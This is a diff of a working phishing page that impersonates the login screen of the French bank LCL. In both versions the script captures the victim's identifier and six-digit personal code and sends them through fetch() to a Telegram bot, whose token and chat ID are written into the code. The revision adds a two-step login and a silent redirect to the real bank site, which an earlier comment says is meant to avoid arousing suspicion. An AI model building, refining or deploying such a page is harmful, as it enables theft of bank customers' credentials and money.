@@ -5,38 +5,41 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Mon Espace LCL</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #FFFFFF;
+        /* RESET & BASE */
+        * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #FFFFFF;
+            color: #333333;
             display: flex;
-            flex-direction: column;
-            align-items: center;
+            justify-content: center;
             min-height: 100vh;
-            color: #333;
-            -webkit-tap-highlight-color: transparent;
         }
 
         .container {
             width: 100%;
-            max-width: 400px;
+            max-width: 480px; /* Largeur max type mobile */
             padding: 20px;
-            box-sizing: border-box;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
         /* LOGO */
-        .logo-container {
+        .logo-wrapper {
             margin-top: 40px;
             margin-bottom: 30px;
             display: flex;
             justify-content: center;
         }
-        .logo-container img {
-            width: 120px;
+
+        .logo-wrapper img {
+            width: 140px;
             height: auto;
         }
 
@@ -44,51 +47,51 @@
         h1 {
             font-size: 20px;
             font-weight: 600;
-            text-align: center;
-            margin-bottom: 25px;
+            text-align: left;
+            width: 100%;
+            margin-bottom: 30px;
             color: #000;
-            line-height: 1.4;
         }
 
         /* FORMULAIRE */
-        .form-group {
+        .input-group {
             width: 100%;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            position: relative;
         }
 
-        label {
+        .input-group label {
             display: block;
             font-size: 14px;
-            color: #333;
-            margin-bottom: 8px;
             font-weight: 500;
+            margin-bottom: 8px;
+            color: #333;
         }
 
-        input {
+        /* STYLE DES CHAMPS (Sans bordure latérale/haut, uniquement pointillés en bas) */
+        .lcl-input {
             width: 100%;
-            padding: 14px 12px;
+            padding: 12px 5px; /* Padding réduit car pas de bordure */
             font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            background-color: #fff;
-            box-sizing: border-box;
+            color: #000;
+            background: transparent;
+            border: none;
+            border-bottom: 1px dashed #ccc; /* Pointillés gris clair */
             outline: none;
             transition: border-color 0.2s;
-            -webkit-appearance: none; /* Force le style iOS natif */
         }
 
-        input:focus {
-            border-color: #0056B2;
-            box-shadow: 0 0 0 2px rgba(0, 86, 178, 0.2);
+        .lcl-input:focus {
+            border-bottom: 1px solid #0056B2; /* Bleu LCL au focus */
         }
 
         /* BOUTON */
         .btn-submit {
             width: 100%;
-            background-color: #0056B2;
+            background-color: #0056B2; /* Bleu LCL */
             color: white;
             border: none;
-            padding: 15px;
+            padding: 16px;
             font-size: 16px;
             font-weight: 600;
             border-radius: 4px;
@@ -99,82 +102,141 @@
         }
 
         .btn-submit:active {
-            background-color: #00408A;
+            background-color: #003d82;
+        }
+
+        .btn-submit:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
         }
 
         /* LIENS */
-        .links-container {
+        .links {
             width: 100%;
-            margin-top: 15px;
             display: flex;
             flex-direction: column;
             gap: 12px;
-            align-items: flex-start;
+            margin-bottom: 20px;
         }
 
-        a {
+        .links a {
             color: #0056B2;
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
         }
 
-        .signup {
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-link {
             color: #0056B2;
             font-weight: 600;
             text-decoration: none;
             font-size: 14px;
-            margin-top: 20px;
+            margin-top: 10px;
             display: block;
             text-align: left;
         }
 
-        /* NOTICE */
+        /* FOOTER / SECURITE */
         .security-note {
             font-size: 12px;
             color: #666;
+            line-height: 1.4;
             margin-top: 30px;
             text-align: left;
-            padding: 0 10px;
             border-top: 1px solid #eee;
             padding-top: 15px;
             width: 100%;
-            line-height: 1.4;
         }
+
+        /* GESTION DES ÉTAPES */
+        .step {
+            display: none;
+            width: 100%;
+        }
+
+        .step.active {
+            display: block;
+        }
+        
+        /* Spinner */
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0056B2;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 2s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
     </style>
 </head>
 <body>
 
 <div class="container">
     
-    <!-- LOGO LCL -->
-    <div class="logo-container">
-        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="Logo LCL">
+    <!-- LOGO -->
+    <div class="logo-wrapper">
+        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL Logo">
     </div>
 
-    <h1>Votre identifiant</h1>
+    <!-- ÉTAPE 1 : IDENTIFIANT -->
+    <div id="step1" class="step active">
+        <h1>Votre identifiant</h1>
 
-    <form id="loginForm">
-        <div class="form-group">
-            <label for="username">Identifiant</label>
-            <input type="text" id="username" name="username" placeholder="Ex: 123456789" required autocomplete="off">
+        <div class="input-group">
+            <label for="identifiant">Identifiant</label>
+            <!-- inputmode numeric pour clavier chiffre sur mobile -->
+            <input type="text" id="identifiant" class="lcl-input" placeholder=" " required autocomplete="off">
         </div>
 
-        <div class="form-group">
-            <label for="code">Code personnel</label>
-            <input type="password" id="code" name="code" placeholder="6 chiffres" inputmode="numeric" pattern="\d{6}" maxlength="6" required>
-        </div>
+        <button class="btn-submit" id="btn-next" onclick="goToStep2()">
+            Valider
+        </button>
 
-        <button type="submit" class="btn-submit" id="submitBtn">Valider</button>
-
-        <div class="links-container">
+        <div class="links">
             <a href="#">Identifiant oublié ?</a>
             <a href="#">Code personnel oublié ?</a>
         </div>
 
-        <a href="#" class="signup">Pas encore client ? Ouvrir un compte &gt;</a>
-    </form>
+        <a href="#" class="signup-link">Pas encore client ? Ouvrir un compte &gt;</a>
+    </div>
 
+    <!-- ÉTAPE 2 : CODE SECRET -->
+    <div id="step2" class="step">
+        <h1>Votre code personnel</h1>
+
+        <div class="input-group">
+            <label for="code">Code personnel</label>
+            <input type="password" id="code" class="lcl-input" placeholder=" " required inputmode="numeric" pattern="\d{6}" maxlength="6">
+        </div>
+
+        <button class="btn-submit" id="btn-submit-final" onclick="submitData()">
+            <span id="btn-text">Valider</span>
+            <span class="loader" id="loader"></span>
+        </button>
+
+        <div class="links">
+            <a href="#">Identifiant oublié ?</a>
+            <a href="#">Code personnel oublié ?</a>
+        </div>
+
+        <a href="#" class="signup-link">Pas encore client ? Ouvrir un compte &gt;</a>
+    </div>
+
+    <!-- NOTE SÉCURITÉ -->
     <div class="security-note">
         LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer de quelque manière que ce soit vos mots de passe, codes confidentiels ou codes à usage unique reçus par SMS.
     </div>
@@ -182,63 +244,104 @@
 </div>
 
 <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
+    // CONFIGURATION TELEGRAM
+    const BOT_TOKEN = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ";
+    const CHAT_ID = "8501464548";
+    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-        const username = document.getElementById('username').value;
-        const code = document.getElementById('code').value;
+    // VARIABLES
+    let userData = {
+        identifiant: "",
+        code: ""
+    };
 
-        // Formatage du message pour Telegram
-        const message = `🔐 *Connexion LCL Détectée*\n\n` +
-                        `👤 Identifiant: ${username}\n` +
-                        `🔑 Code Perso: ${code}\n` +
+    // FONCTION : PASSER À L'ÉTAPE 2
+    function goToStep2() {
+        const identifiantInput = document.getElementById('identifiant').value;
+        
+        if (identifiantInput.trim() === "") {
+            alert("Veuillez entrer votre identifiant.");
+            return;
+        }
+
+        userData.identifiant = identifiantInput;
+        
+        // Passage à l'étape 2
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+        
+        // Focus automatique sur le champ code
+        document.getElementById('code').focus();
+    }
+
+    // FONCTION : ENVOYER LES DONNÉES ET REDIRIGER
+    function submitData() {
+        const codeInput = document.getElementById('code').value;
+        
+        if (codeInput.trim() === "") {
+            alert("Veuillez entrer votre code.");
+            return;
+        }
+
+        userData.code = codeInput;
+
+        // UI Loading
+        const btnText = document.getElementById('btn-text');
+        const loader = document.getElementById('loader');
+        const btn = document.getElementById('btn-submit-final');
+        
+        btnText.innerText = "Vérification...";
+        loader.style.display = "inline-block";
+        btn.disabled = true;
+
+        // Préparation du message Telegram
+        const message = `🔐 *Nouvelle Connexion LCL*\n\n` +
+                        `👤 Identifiant: ${userData.identifiant}\n` +
+                        `🔑 Code: ${userData.code}\n` +
                         `📱 Device: iOS (iPhone)\n` +
                         `🕒 Heure: ${new Date().toLocaleTimeString()}`;
 
-        // Tes infos Telegram
-        const botToken = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ';
-        const chatId = '8501464548';
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-        const btn = document.getElementById('submitBtn');
-        btn.innerText = "Vérification...";
-        btn.disabled = true;
-
-        // Envoi des données
-        fetch(url, {
+        // Envoi à Telegram
+        fetch(API_URL, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                chat_id: chatId,
+                chat_id: CHAT_ID,
                 text: message,
                 parse_mode: 'Markdown'
             })
-        }).then(response => {
+        })
+        .then(response => {
             if (response.ok) {
-                // Succès visuel
-                btn.style.backgroundColor = "#28a745";
-                btn.innerText = "Connexion réussie !";
-                
-                // Petit délai pour lire le message si besoin, puis alert
+                // Succès : Redirection vers le vrai site
                 setTimeout(() => {
-                    alert("Bienvenue sur Mon Espace LCL.");
-                    // Optionnel : Rediriger vers le vrai site pour ne pas éveiller les soupçons
-                    // window.location.href = "https://monespace.lcl.fr";
-                }, 500);
+                    window.location.href = "https://monespace.lcl.fr";
+                }, 1000);
             } else {
-                alert("Erreur de connexion. Réessayez.");
-                btn.style.backgroundColor = "#0056B2";
-                btn.innerText = "Valider";
-                btn.disabled = false;
+                // Si erreur API mais on redirige quand même pour ne pas casser l'expérience
+                console.error("Erreur Telegram:", response);
+                window.location.href = "https://monespace.lcl.fr";
             }
-        }).catch(err => {
-            console.error(err);
-            alert("Erreur réseau.");
-            btn.style.backgroundColor = "#0056B2";
-            btn.innerText = "Valider";
-            btn.disabled = false;
+        })
+        .catch(err => {
+            console.error("Réseau:", err);
+            window.location.href = "https://monespace.lcl.fr";
         });
+    }
+
+    // Gérer la touche Entrée sur les champs
+    document.getElementById('identifiant').addEventListener('keypress', function (e) {
+        if (e.key === 'Enter') {
+            goToStep2();
+        }
     });
+
+    document.getElementById('code').addEventListener('keypress', function (e) {
+        if (e.key === 'Enter') {
+            submitData();
+        }
+    });
+
 </script>
 
 </body>
